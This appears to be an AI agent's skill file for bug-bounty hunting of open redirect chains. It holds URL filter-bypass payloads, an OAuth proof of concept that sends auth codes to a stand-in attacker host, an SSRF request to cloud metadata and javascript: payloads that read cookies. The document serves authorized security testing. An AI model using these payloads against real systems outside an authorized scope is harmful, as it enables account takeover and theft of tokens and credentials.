---
name: open-redirect
description: "Open redirect chain hunting — OAuth redirect_uri manipulation for token theft, SSRF whitelist bypass via redirect, javascript: URI XSS, SAML RelayState redirect, URL parser confusion bypasses. Use when testing OAuth/SSO flows, redirect parameters, or login/callback endpoints. Standalone open redirect is rejected — must chain."
---

# Open Redirect — Chains & Escalation

## Crown Jewel Targets

- **OAuth/OIDC authorization endpoints** — redirect_uri manipulation → auth code/token sent to attacker domain (Critical ATO)
- **SAML SSO RelayState** — redirect after authentication → SAML assertion visible to attacker
- **Login redirect chains** (`/login?redirect=`, `/auth?returnTo=`) — social engineering + credential phishing on trusted domain
- **Internal SSRF endpoints** that follow redirects — open redirect on same domain bypasses SSRF whitelist → cloud metadata access
- **Single-page apps** with client-side routing — `window.location = user_input` → `javascript:` URI → XSS
- **Password reset flows** with redirect — `/?redirect=https://evil.com` → post-reset redirect sends reset token to attacker
- **Payment callback URLs** — redirect_uri in payment gateway flow → payment confirmation sent to attacker

## Attack Surface Signals

- **URL patterns**: `?redirect=`, `?returnTo=`, `?next=`, `?url=`, `?target=`, `?destination=`, `?continue=`, `?forward=`, `?callback=`, `?r=`, `?go=`
- **Response headers**: `Location:` header with user-controlled domain, `302`/`301`/`307` redirect responses
- **OAuth patterns**: `/authorize?redirect_uri=`, `/oauth/callback`, `.well-known/openid-configuration` listing redirect URIs
- **JS patterns**: `window.location = `, `window.location.href = `, `location.assign()`, `location.replace()` with URL parameters
- **Tech stack signals**: OAuth/OIDC flows, SAML SSO, Next.js routing, Django `next` parameter, Rails `redirect_to`
- **Positive indicators**: Redirect to external domain succeeds, `@` or `//` bypasses domain validation, meta refresh with user input

## Why 30% Accept Rate (Standalone = Rejected)

Open redirect standalone is rejected by ~90% of programs. To get accepted:
- **Must chain** into OAuth token theft, SSRF, XSS, or SSO bypass
- OR target must explicitly list open redirect as in-scope

## Detection

```bash
# Common redirect parameters
redirect, redirect_uri, return, returnTo, next, url, target, destination, 
redir, continue, forward, go, out, view, ref, callback, return_url, r, u

# Basic test
curl -sI "https://target.com/login?redirect=https://evil.com" | grep -i location

# Bypass patterns for filter evasion
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=https://evil.com%23.target.com
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=https://target.com.evil.com
https://target.com/redirect?url=\/\/evil.com
https://target.com/redirect?url=https:%2f%2fevil.com
```

## Filter Bypass Techniques

### URL parser confusion
```
// Backslash trick
https://evil.com\@target.com

// Tab/newline in URL
https://evil.com%09.target.com
https://evil%0a.com

// Fragment trick
https://target.com#@evil.com

// Null byte
https://evil.com%00.target.com

// Data URI
data:text/html,<script>alert(1)</script>

// JavaScript URI (if used in href)
javascript:alert(document.domain)
```

### Domain validation bypass
```
// If filter checks "must contain target.com"
https://evil.com?target.com
https://evil.com/target.com
https://target.com.evil.com
https://targetxcom.evil.com  (dot → x bypass)

// If filter checks startswith("https://target.com")
https://target.com@evil.com
https://target.com%2f@evil.com

// IP-based bypass
https://0x7f000001  (127.0.0.1 in hex)
https://2130706433  (127.0.0.1 in decimal)
```

## Chain Attacks (HIGH VALUE)

### 1. Open Redirect → OAuth Token Theft (CRITICAL)
```
1. Find OAuth flow: /authorize?client_id=X&redirect_uri=CALLBACK
2. Test redirect_uri manipulation:
   /authorize?client_id=X&redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
3. If redirect_uri validation is loose:
   - Token/code sent to attacker via open redirect
   - Full account takeover possible
```

### 2. Open Redirect → SSRF
```bash
# If internal service follows redirects
# Step 1: Find SSRF point that fetches URLs
# Step 2: Use open redirect to bypass SSRF domain whitelist
curl "https://target.com/api/fetch?url=https://target.com/redirect?url=http://169.254.169.254/metadata"
```

### 3. Open Redirect → XSS (via javascript: URI)
```
# If redirect handler uses window.location = user_input
https://target.com/redirect?url=javascript:alert(document.cookie)

# If redirect is via meta refresh or header
# Less likely to work, but test data: and javascript: URIs
```

### 4. Open Redirect → Phishing (minimal value)
```
# Only report if program explicitly accepts phishing chains
# Most programs reject "phishing" as impact for open redirect
https://target.com/login?redirect=https://evil-target-lookalike.com/login
```

### 5. Open Redirect → SSO/SAML Bypass
```
# SAML RelayState open redirect
https://target.com/saml/login?RelayState=https://evil.com
# After auth, user redirected to attacker page with SAML assertion visible
```

## PoC Template (OAuth Chain)

```
1. Victim clicks: https://target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://target.com/callback/../redirect?url=https://attacker.com/steal&response_type=code&scope=profile

2. Server redirects to: https://target.com/redirect?url=https://attacker.com/steal?code=AUTH_CODE

3. Attacker receives auth code at: https://attacker.com/steal?code=AUTH_CODE

4. Attacker exchanges code for token → full account access
```

## Impact Tiers

| Chain | Severity | Accept Rate |
|-------|----------|-------------|
| OAuth token theft | Critical | 85% |
| SSRF bypass | High | 75% |
| XSS (javascript: URI) | High | 70% |
| SSO assertion theft | High | 70% |
| Phishing only | Low | 10% (usually rejected) |
| Standalone redirect | N/A | 5% (rejected) |

## Triage Checklist

- [ ] Open redirect confirmed (actual redirect to external domain)
- [ ] Chain attack demonstrated (not standalone)
- [ ] Impact proven (token stolen, SSRF executed, XSS triggered)
- [ ] Bypass documented (how validation was evaded)
- [ ] Program does NOT list open redirect in always_rejected
- [ ] Working PoC with end-to-end exploitation

## PortSwigger Academy — Advanced Techniques

- **redirect_uri path traversal**: `https://client.com/callback/../../example/path`
- **redirect_uri URI confusion**: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
- **redirect_uri parameter pollution**: `?redirect_uri=legit&redirect_uri=evil`
- **localhost bypass**: `redirect_uri=https://localhost.evil-user.net/callback`
- **response_mode mutation**: Switch to `fragment` or `web_message` to alter parsing

## Operator Notes (Battle-Tested)

1. **Never report standalone open redirect**: 90% of programs reject it. Always chain into OAuth token theft, SSRF bypass, or XSS. If you cannot chain it, record it as an inferred fact via record_fact (not a finding) and move on.
2. **redirect_uri path traversal is the highest-value test**: `https://client.com/callback/../../redirect?url=https://evil.com` — bypass redirect_uri validation by traversing out of the allowed path. Test on every OAuth flow.
3. **Test all URL parser confusion patterns**: `https://target.com@evil.com`, `//evil.com`, `https://evil.com%23.target.com`, `\/\/evil.com`, domain with tab/newline characters. Browsers, servers, and CDNs parse URLs differently.
4. **SSRF whitelist bypass is the most overlooked chain**: If an internal service fetches URLs and whitelists `*.target.com`, an open redirect on `target.com` lets you redirect the SSRF to `169.254.169.254` or internal services. Test every open redirect as an SSRF stepping stone.
5. **Check scope/constraints before testing**: review the task's goal and action constraints for whether open redirect is explicitly out of scope before investing time. Even chained redirects may be out of scope for some programs.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Open redirect in OAuth flow | `oauth-testing` (full ATO chain) |
| Open redirect as SSRF bypass | `ssrf-testing` |
| redirect parameter accepts `javascript:` URI | `xss-testing` (XSS) |
| SAML RelayState redirect | `auth-bypass-testing` → `references/saml-bypass-techniques.md` |
| Need to bypass URL validation filter | `waf-bypass` → `references/waf-generic-evasion.md` |
| Open redirect + cache poisoning | `cache-poisoning` |
